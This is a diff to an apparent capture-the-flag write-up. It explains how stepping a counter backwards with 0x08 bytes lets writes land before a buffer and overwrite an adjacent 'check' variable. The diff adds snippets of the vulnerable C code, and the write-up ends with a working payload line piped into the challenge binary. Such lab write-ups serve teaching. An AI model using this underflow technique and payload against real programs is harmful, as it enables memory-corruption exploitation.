@@ -75,7 +75,20 @@ The vulnerable is in the size of **buffer**. But **buffer** is declared before *
 It's possible to make a change in **check** by lower overflow in **buffer** array. It's mean overwriting `buffer[-1]`, `buffer[-2]`,`buffer[-3]` and `buffer[-4]` revalues **check**.
 With the program provided, we have 2 main functions:
 - Make count increase or decrease by 1 (and print something that we don't care)
+```
+                case 0x08:
+                  count--;
+                  printf("\b");
+                  break;
+```
+
 - Set **buffer** with **i** 's value
+```
+                default:
+                  buffer[count] = i;
+                  count++;
+                  break;
+```
 So just enter **i** with **0x08** 4 times and assign the desired value **0xbffffabc** in little endian format.
 
 Payload: `(python -c "print('\x08'*4+'\xbc\xfa\xff\xbf')";cat) | ./ch16`
